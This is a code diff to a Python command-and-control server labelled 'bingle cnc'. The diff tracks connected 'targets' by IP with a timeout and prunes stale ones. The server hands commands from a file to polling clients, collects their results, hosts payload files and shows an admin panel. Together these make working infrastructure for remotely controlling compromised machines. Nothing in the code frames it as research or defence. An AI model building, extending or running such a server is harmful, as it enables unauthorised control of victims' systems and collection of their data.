@@ -17,6 +17,7 @@ COMMAND_FILE = "command.txt"
 RESULT_FILE = "results.log"
 PAYLOAD_DIR = "payloads"
 LOG_RETENTION_MINUTES = 10
+TARGET_TIMEOUT_SECONDS = 90
 
 if not os.path.exists(COMMAND_FILE):
     with open(COMMAND_FILE, "w") as f:
@@ -30,8 +31,8 @@ def load_command():
     with open(COMMAND_FILE, "r") as f:
         return f.read().strip()
 
-seen_targets = set()
-seen_targets_lock = threading.Lock()
+targets = {}
+targets_lock = threading.Lock()
 
 def cleanup_old_logs():
     if not os.path.exists(RESULT_FILE):
@@ -91,11 +92,28 @@ def periodic_log_cleanup():
         time.sleep(60)
         cleanup_old_logs()
 
+def mark_target(ip):
+    now = time.time()
+    with targets_lock:
+        is_new = ip not in targets
+        targets[ip] = now
+        if is_new:
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {ip} (total: {len(targets)})")
+
+def prune_stale_targets():
+    with targets_lock:
+        now = time.time()
+        stale = [ip for ip, ts in targets.items() if now - ts > TARGET_TIMEOUT_SECONDS]
+        for ip in stale:
+            del targets[ip]
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Target gone: {ip} (total: {len(targets)})")
+
 def print_target_count():
     while True:
         time.sleep(30)
-        with seen_targets_lock:
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] Targets: {len(seen_targets)}")
+        prune_stale_targets()
+        with targets_lock:
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Targets: {len(targets)}")
 
 class C2Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
@@ -103,11 +121,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         path = parsed.path
 
         if path == "/command.txt":
-            client_ip = self.client_address[0]
-            with seen_targets_lock:
-                if client_ip not in seen_targets:
-                    seen_targets.add(client_ip)
-                    print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {client_ip} (total: {len(seen_targets)})")
+            mark_target(self.client_address[0])
 
             command = load_command()
             self.send_response(200)
@@ -120,8 +134,8 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
 
         elif path == "/admin":
             command = load_command()
-            with seen_targets_lock:
-                target_count = len(seen_targets)
+            with targets_lock:
+                target_count = len(targets)
             html = f"""<!DOCTYPE html>
 <html>
 <head>
@@ -217,11 +231,7 @@ pre {{ white-space: pre-wrap; word-break: break-all; }}
             self.end_headers()
 
         elif path == "/result.txt":
-            client_ip = self.client_address[0]
-            with seen_targets_lock:
-                if client_ip not in seen_targets:
-                    seen_targets.add(client_ip)
-                    print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {client_ip} (total: {len(seen_targets)})")
+            mark_target(self.client_address[0])
 
             content_length = int(self.headers.get("Content-Length", 0))
             body = self.rfile.read(content_length).decode()
@@ -280,13 +290,14 @@ class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
 if __name__ == "__main__":
     print(f"""
 +----------------------------------------------+
-|                   bingle cnc                 |
+|                 bingle cnc                   |
 +----------------------------------------------+
 |  admin panel: http://0.0.0.0:{PORT}/admin      |
 |  command:     http://0.0.0.0:{PORT}/command.txt|
 |  results:     http://0.0.0.0:{PORT}/results    |
 |  payloads:    http://0.0.0.0:{PORT}/<file>     |
 |  log retention: {LOG_RETENTION_MINUTES} min                       |
+|  target timeout: {TARGET_TIMEOUT_SECONDS}s                         |
 +----------------------------------------------+
 """)
 
